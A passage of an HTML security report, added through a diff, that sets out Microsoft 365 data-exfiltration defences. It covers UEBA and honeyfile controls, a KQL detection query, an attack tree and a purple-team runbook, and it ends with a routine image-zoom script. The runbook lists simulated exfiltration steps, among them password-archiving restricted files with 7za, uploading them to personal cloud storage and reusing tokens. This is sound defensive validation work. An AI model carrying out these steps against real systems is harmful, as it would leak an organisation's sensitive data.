+<li><strong>Control 3:</strong> Microsoft Purview Audit (Premium) log retention for 365 days: provides full activity history for forensic reconstruction when an APT is discovered months after initial access.</li>
+<li><strong>Control 4:</strong> Entra ID Identity Protection continuous risk scoring: even low-frequency access from risk-flagged IPs or devices accumulates risk score over time — Continuous Access Evaluation can interrupt the session when score crosses threshold.</li>
+<li><strong>Control 5:</strong> File-level integrity monitoring on RESTRICTED SharePoint sites: alert on any access to files with specific sensitivity keywords (M&amp;A targets, deal codenames) from accounts that do not normally access those files — context-based access anomaly.</li>
+</ul>
+<h4 id="evidence-and-telemetry-to-validate-controls_13">Evidence and telemetry to validate controls</h4>
+<ul>
+<li>UEBA platform (Microsoft Sentinel UEBA, Exabeam, Securonix): user risk score trending over 90-day period; daily download count versus peer group baseline.</li>
+<li>Honeyfile access events: canary document tracking tokens trigger web callback — log includes <code>DocumentId</code>, <code>AccessorIPAddress</code>, <code>UserAgent</code>, <code>Timestamp</code> — single event is sufficient for P0 alert.</li>
+<li>SharePoint Unified Audit Log (365-day retention with Premium): <code>Operation = FileDownloaded</code>, <code>UserId</code>, <code>FileName</code> — long-term pattern analysis across all accessed files per user.</li>
+<li>Microsoft Purview Insider Risk Management: user risk score accumulation from multiple low-frequency signals (file downloads, email sends, USB writes) that individually don't alert but collectively indicate pattern.</li>
+</ul>
+<h4 id="purple-team-validation-commands_13">Purple-team validation commands</h4>
+<pre><code class="language-powershell"># Validate honeyfile exists and has access tracking configured
+# (Authorized lab: create canary file and verify access triggers alert)
+# Step 1: Create canary document with unique identifier in RESTRICTED site
+# Step 2: Access the canary document from a test account
+# Step 3: Verify alert fires in SIEM/SOAR within 5 minutes
+# Canary file should contain an embedded web beacon (1x1 pixel image from logging server)
+# or use Microsoft Purview Activity Explorer to track first-access events
+
+# Check Purview Audit log retention is set to 365 days (Premium license required)
+Get-AdminAuditLogConfig | Select-Object UnifiedAuditLogIngestionEnabled
+Get-RetentionPolicy | Where-Object { $_.Name -like &quot;*Audit*&quot; } | Select-Object Name, RetentionDuration
+</code></pre>
+<pre><code class="language-kql">// KQL: UEBA-based slow exfiltration detection using 90-day baseline
+// Source: OfficeActivity (SharePoint FileDownloaded)
+let baseline = OfficeActivity
+| where TimeGenerated between (ago(97d) .. ago(7d))
+| where Operation == &quot;FileDownloaded&quot;
+| summarize AvgDailyDownloads = avg(count()), StdDev = stdev(count())
+    by UserId, bin(TimeGenerated, 1d)
+| summarize BaselineAvg = avg(AvgDailyDownloads), BaselineStdDev = avg(StdDev) by UserId;
+OfficeActivity
+| where TimeGenerated &gt; ago(7d)
+| where Operation == &quot;FileDownloaded&quot;
+| summarize RecentDailyDownloads = count() by UserId, bin(TimeGenerated, 1d)
+| join kind=inner baseline on UserId
+| where RecentDailyDownloads &gt; (BaselineAvg + 3 * BaselineStdDev)  // 3 sigma deviation
+| project TimeGenerated, UserId, RecentDailyDownloads, BaselineAvg, BaselineStdDev
+| order by RecentDailyDownloads desc
+</code></pre>
+<h4 id="attack-tree-with-control-breakpoints_13">Attack tree with control breakpoints</h4>
+<pre class="mermaid">
+flowchart TD
+    A1[APT has persistent access via compromised account or token]:::attack
+    A1 --> A2[Downloads 1-3 files per day during business hours]:::attack
+    A2 --> C1{UEBA 90-day baseline detects gradual volume increase?}:::control
+    C1 -->|Yes| B1[User risk score elevated - SOAR forces step-up auth review]:::blocked
+    C1 -->|No - flat thresholds only| A3[Volume never crosses single-event threshold - undetected for months]:::attack
+    A3 --> A4[Targeted access to M&A or source code files]:::attack
+    A4 --> C2{Honeyfile access triggers P0 alert regardless of volume?}:::control
+    C2 -->|Yes| B2[Single honeyfile access fires immediate P0 - APT discovered]:::blocked
+    C2 -->|No - no honeyfiles deployed| A5[All targeted files accessed and exfiltrated over 6-12 months]:::attack
+    A5 --> C3{365-day audit log enables forensic reconstruction?}:::control
+    C3 -->|Yes| B3[Full access history reconstructed for legal and regulatory response]:::blocked
+    C3 -->|No - 90-day retention only| A6[Breach scope unrecoverable - cannot determine what was taken]:::impact
+
+    classDef attack fill:#ffe6e6,stroke:#cc0000,color:#111;
+    classDef control fill:#e6f2ff,stroke:#0066cc,color:#111;
+    classDef blocked fill:#e8f5e9,stroke:#1b5e20,color:#111;
+    classDef impact fill:#fff3cd,stroke:#b8860b,color:#111;
+</pre>
+<hr />
+<h2 id="7-purple-team-exercise-runbook-summary">7. Purple-Team Exercise Runbook Summary</h2>
+<table>
+<thead>
+<tr>
+<th>Threat ID</th>
+<th>Safe Validation Test</th>
+<th>Evidence of Pass</th>
+<th>Evidence of Fail</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>T1</td>
+<td>Create test inbox rule with external ForwardTo in lab tenant; verify SIEM alert fires within 5 min and SOAR auto-deletes rule</td>
+<td>Exchange UAL shows alert + Remove-InboxRule execution</td>
+<td>No alert; rule persists; or alert fires &gt; 10 min later</td>
+</tr>
+<tr>
+<td>T2</td>
+<td>Upload a 200MB test file to personal Dropbox from managed endpoint connected to lab CASB</td>
+<td>CASB block event with content hash; SIEM alert</td>
+<td>No block event; file appears in Dropbox; no SIEM alert</td>
+</tr>
+<tr>
+<td>T3</td>
+<td>Insert USB drive and attempt to copy RESTRICTED-labeled test file on managed endpoint</td>
+<td>Endpoint DLP agent block event; Event ID 4663</td>
+<td>File copied successfully; no DLP agent event</td>
+</tr>
+<tr>
+<td>T4</td>
+<td>Run <code>7za.exe a -p&lt;test&gt; output.zip &lt;RESTRICTED-file&gt;</code> on managed endpoint within 30 min of label access</td>
+<td>SIEM alert on 7za with -p flag in sensitive context</td>
+<td>No process telemetry; archive created without alert</td>
+</tr>
+<tr>
+<td>T5</td>
+<td>Simulate high-risk sign-in (VPN exit node in threat intel feed) to SharePoint and attempt bulk download</td>
+<td>CAE revokes session; Conditional Access blocks; SIEM impossible-travel fires</td>
+<td>Bulk download succeeds; no SIEM alert</td>
+</tr>
+<tr>
+<td>T6</td>
+<td>Register test OAuth app with Files.Read.All scope; attempt user consent in lab tenant</td>
+<td>Consent blocked — admin approval required; AuditLogs show ConsentRequired</td>
+<td>User consent succeeds; no alert; app gains token</td>
+</tr>
+<tr>
+<td>T7</td>
+<td>Modify DLP policy exclusion list via GUI in lab environment with no ITSM ticket open</td>
+<td>SIEM alert within 5 min; SOAR initiates Terraform revert; CISO notified</td>
+<td>No alert; policy change persists without revert</td>
+</tr>
+<tr>
+<td>T8</td>
+<td>Print RESTRICTED-labeled document to PDF printer on managed endpoint</td>
+<td>Endpoint DLP audit log event for print action; user prompted for justification</td>
+<td>No DLP event; PDF created without any log entry</td>
+</tr>
+<tr>
+<td>T9</td>
+<td>Attempt SharePoint CONFIDENTIAL site access from unenrolled test device</td>
+<td>Conditional Access blocks with DeviceNotCompliant reason</td>
+<td>Access succeeds; CONFIDENTIAL file downloadable</td>
+</tr>
+<tr>
+<td>T10</td>
+<td>Create scanned PDF with SSN values (no text layer); transmit via email</td>
+<td>DLP with OCR catches PII match; or mandatory-label policy prompts for label</td>
+<td>PDF passes email gateway with no DLP match or label prompt</td>
+</tr>
+<tr>
+<td>T11</td>
+<td>Disable CASB roaming client on managed test device; access SharePoint CONFIDENTIAL</td>
+<td>Conditional Access blocks access when CASB heartbeat absent</td>
+<td>Access succeeds; CASB-free upload to personal cloud completes</td>
+</tr>
+<tr>
+<td>T12</td>
+<td>Disable test user account; attempt Graph API call with previously issued refresh token</td>
+<td>Token refresh returns 401; SIEM shows Revoke session event within 2 min of disable</td>
+<td>Token refresh succeeds post-disable; Graph API data accessible</td>
+</tr>
+<tr>
+<td>T13</td>
+<td>Trigger CI/CD pipeline with intentional volume spike (100x normal file downloads)</td>
+<td>SIEM baseline anomaly alert fires; pipeline investigated</td>
+<td>No alert; bulk download completes without detection</td>
+</tr>
+<tr>
+<td>T14</td>
+<td>Access canary honeyfile from test account; verify alert fires immediately</td>
+<td>P0 alert fires within 60 seconds of honeyfile access regardless of volume</td>
+<td>No alert; honeyfile access goes undetected</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="8-control-coverage-heatmap">8. Control Coverage Heatmap</h2>
+<table>
+<thead>
+<tr>
+<th>Control Area</th>
+<th>Threats Covered</th>
+<th>Gaps</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Identity and authentication</td>
+<td>T5, T6, T9, T12</td>
+<td>BYOD with valid credentials has no second factor beyond MFA — session binding weak without CAE</td>
+</tr>
+<tr>
+<td>Network segmentation and access control</td>
+<td>T2, T9, T11</td>
+<td>Mobile hotspot path has no network-layer control unless roaming client is enforced</td>
+</tr>
+<tr>
+<td>Endpoint and workload protection</td>
+<td>T3, T4, T8, T11</td>
+<td>macOS and Linux DLP agent depth is lower than Windows; BYOD has zero endpoint coverage</td>
+</tr>
+<tr>
+<td>Logging, detection, and SIEM</td>
+<td>T1, T2, T4, T7, T12, T13, T14</td>
+<td>UEBA baseline requires 90-day warm-up period; new users have no baseline for first 3 months</td>
+</tr>
+<tr>
+<td>Incident response and containment</td>
+<td>T1, T2, T5, T12</td>
+<td>Print-to-PDF and camera capture (T8) have no automated containment path</td>
+</tr>
+<tr>
+<td>Secrets and cryptographic material protection</td>
+<td>T6, T13</td>
+<td>CI/CD PAT rotation is manual at most organizations; secret sprawl into env variables is common</td>
+</tr>
+<tr>
+<td>Supply chain and third-party risk</td>
+<td>T6, T13</td>
+<td>OAuth app governance and CI/CD service account reviews are often quarterly — gap window is 89 days</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="9-top-5-immediate-actions">9. Top 5 Immediate Actions</h2>
+<blockquote>
+<p>Ordered by risk reduction per implementation effort.</p>
+</blockquote>
+<ol>
+<li>
+<p><strong>Enforce <code>Set-RemoteDomain -AutoForwardEnabled $false</code> and add SIEM rule for inbox rule creation</strong> — closes T1. Implementation: Exchange Online PowerShell; alert on <code>New-InboxRule</code> with external <code>ForwardTo</code> in Exchange Unified Audit Log within 5 minutes; SOAR auto-deletes the rule.</p>
+</li>
+<li>
+<p><strong>Migrate DLP policy management to infrastructure-as-code with SIEM owned by an independent team</strong> — closes T7. Implementation: all Purview DLP policies in Terraform stored in Git with PR review; GUI set to read-only for production; weekly canary pipeline tests DLP blocking with results sent to CISO, bypassing the DLP team.</p>
+</li>
+<li>
+<p><strong>Enforce CASB roaming client as a Conditional Access compliance requirement</strong> — closes T2, T11. Implementation: Intune Compliance Policy requires <code>CASB_agent_heartbeat = true</code>; Conditional Access blocks CONFIDENTIAL SharePoint access for non-compliant devices; DNS category block for personal cloud storage applied on-device via roaming client.</p>
+</li>
+<li>
+<p><strong>Block user OAuth consent; enforce 24-hour token lifetime for data-scope apps; automate token revocation at HR termination</strong> — closes T6, T12. Implementation: Azure AD <code>User consent for apps = Do not allow</code>; token lifetime policy via Entra ID named location; SCIM provisioning triggers <code>Revoke-MgUserSignInSession</code> within 2 minutes of HR termination event.</p>
+</li>
+<li>
+<p><strong>Deploy honeyfiles in all RESTRICTED-tier SharePoint sites and configure mandatory human labeling for RESTRICTED tier</strong> — closes T10, T14. Implementation: plant 1–3 uniquely watermarked canary files per sensitive site with web beacon callbacks; Purview mandatory labeling SDK enforces manual label for RESTRICTED documents at save time; any honeyfile access fires P0 SIEM alert.</p>
+</li>
+</ol>
+
+  <!-- ── Image zoom overlay ───────────────────────────── -->
+  <div id="img-zoom-overlay">
+    <div id="img-zoom-wrap">
+      <img id="img-zoom-el" src="" alt="">
+    </div>
+    <div id="img-zoom-controls">
+      <button id="zoom-out-btn"  title="Zoom out (scroll down / minus)">&#8722;</button>
+      <span   id="img-zoom-level">100%</span>
+      <button id="zoom-in-btn"   title="Zoom in (scroll up / plus)">&#43;</button>
+      <button id="zoom-reset-btn" title="Reset (key: 0)">&#8635;</button>
+    </div>
+    <button id="img-zoom-close" title="Close (Esc)">&#10005;</button>
+    <span   id="img-zoom-hint">Scroll to zoom &nbsp;·&nbsp; Drag to pan &nbsp;·&nbsp; Esc to close</span>
+  </div>
+
+  <script>
+  (function () {
+    var overlay   = document.getElementById('img-zoom-overlay');
+    var wrap      = document.getElementById('img-zoom-wrap');
+    var zoomEl    = document.getElementById('img-zoom-el');
+    var levelEl   = document.getElementById('img-zoom-level');
+    var closeBtn  = document.getElementById('img-zoom-close');
+    var btnIn     = document.getElementById('zoom-in-btn');
+    var btnOut    = document.getElementById('zoom-out-btn');
+    var btnReset  = document.getElementById('zoom-reset-btn');
+
+    var scale = 1, tx = 0, ty = 0;
+    var MIN = 0.15, MAX = 12, STEP = 0.2;
+
+    function applyTransform() {
+      zoomEl.style.transform =
+        'translate(' + tx + 'px,' + ty + 'px) scale(' + scale + ')';
+      levelEl.textContent = Math.round(scale * 100) + '%';
+    }
+
+    function openOverlay(src, alt) {
+      zoomEl.src = src;
+      zoomEl.alt = alt || '';
+      scale = 1; tx = 0; ty = 0;
+      applyTransform();
+      overlay.classList.add('active');
+      document.body.style.overflow = 'hidden';
+    }
+
+    function closeOverlay() {
+      overlay.classList.remove('active');
+      document.body.style.overflow = '';
+      zoomEl.src = '';
+    }
+
+    // Wire click on every page image.
+    // Uses closest('a') so anchor wrappers at ANY ancestor depth are caught.
+    // Standalone images (no ancestor <a>) get the listener on the <img> itself.
+    document.querySelectorAll('img:not(#img-zoom-el)').forEach(function (img) {
+      var anchor = img.closest('a');
+      if (anchor) {
+        anchor.style.cursor = 'zoom-in';
+        anchor.addEventListener('click', function (e) {
+          e.preventDefault();
+          e.stopPropagation();
+          openOverlay(img.src, img.alt);
+        });
+      } else {
+        img.style.cursor = 'zoom-in';
+        img.addEventListener('click', function (e) {
+          e.stopPropagation();
+          openOverlay(img.src, img.alt);
+        });
+      }
+    });
+
+    closeBtn.addEventListener('click', closeOverlay);
+    overlay.addEventListener('click', function (e) {
+      if (e.target === overlay || e.target === wrap) closeOverlay();
+    });
+
+    document.addEventListener('keydown', function (e) {
+      if (!overlay.classList.contains('active')) return;
+      if (e.key === 'Escape') { closeOverlay(); return; }
+      if (e.key === '+' || e.key === '=') { scale = Math.min(MAX, scale + STEP); applyTransform(); }
+      if (e.key === '-')                  { scale = Math.max(MIN, scale - STEP); applyTransform(); }
+      if (e.key === '0')                  { scale = 1; tx = 0; ty = 0; applyTransform(); }
+    });
+
+    btnIn.addEventListener('click',    function () { scale = Math.min(MAX, scale + STEP); applyTransform(); });
+    btnOut.addEventListener('click',   function () { scale = Math.max(MIN, scale - STEP); applyTransform(); });
+    btnReset.addEventListener('click', function () { scale = 1; tx = 0; ty = 0; applyTransform(); });
+
+    // Scroll-wheel zoom (zoom towards cursor)
+    wrap.addEventListener('wheel', function (e) {
+      e.preventDefault();
+      var rect  = wrap.getBoundingClientRect();
+      var cx    = e.clientX - rect.left  - rect.width  / 2;
+      var cy    = e.clientY - rect.top   - rect.height / 2;
+      var delta = e.deltaY < 0 ? STEP : -STEP;
+      var newScale = Math.min(MAX, Math.max(MIN, scale + delta));
+      var ratio    = newScale / scale;
+      tx = cx + ratio * (tx - cx);
+      ty = cy + ratio * (ty - cy);
+      scale = newScale;
+      applyTransform();
+    }, { passive: false });
+
+    // Mouse drag to pan
+    var dragging = false, dsx = 0, dsy = 0, stx = 0, sty = 0;
+    wrap.addEventListener('mousedown', function (e) {
+      dragging = true; wrap.classList.add('dragging');
+      dsx = e.clientX; dsy = e.clientY;
+      stx = tx;        sty = ty;
+      e.preventDefault();
+    });
+    document.addEventListener('mousemove', function (e) {
+      if (!dragging) return;
+      tx = stx + (e.clientX - dsx);
+      ty = sty + (e.clientY - dsy);
+      applyTransform();
+    });
+    document.addEventListener('mouseup', function () {
+      if (dragging) { dragging = false; wrap.classList.remove('dragging'); }
+    });
+
+    // Touch: pinch-to-zoom + single-finger pan
+    var lastDist = 0, pinchStartScale = 1;
+    wrap.addEventListener('touchstart', function (e) {
+      if (e.touches.length === 2) {
+        var dx = e.touches[0].clientX - e.touches[1].clientX;
+        var dy = e.touches[0].clientY - e.touches[1].clientY;
+        lastDist = Math.hypot(dx, dy);
+        pinchStartScale = scale;
+      } else if (e.touches.length === 1) {
+        dragging = true;
+        dsx = e.touches[0].clientX; dsy = e.touches[0].clientY;
+        stx = tx; sty = ty;
+      }
+    }, { passive: true });
+    wrap.addEventListener('touchmove', function (e) {
+      if (e.touches.length === 2) {
+        e.preventDefault();
+        var dx   = e.touches[0].clientX - e.touches[1].clientX;
+        var dy   = e.touches[0].clientY - e.touches[1].clientY;
+        var dist = Math.hypot(dx, dy);
+        scale = Math.min(MAX, Math.max(MIN, pinchStartScale * (dist / lastDist)));
+        applyTransform();
+      } else if (e.touches.length === 1 && dragging) {
+        tx = stx + (e.touches[0].clientX - dsx);
+        ty = sty + (e.touches[0].clientY - dsy);
+        applyTransform();
+      }
+    }, { passive: false });
+    wrap.addEventListener('touchend', function () { dragging = false; });
+  })();
+  </script>
+</body>
+</html>
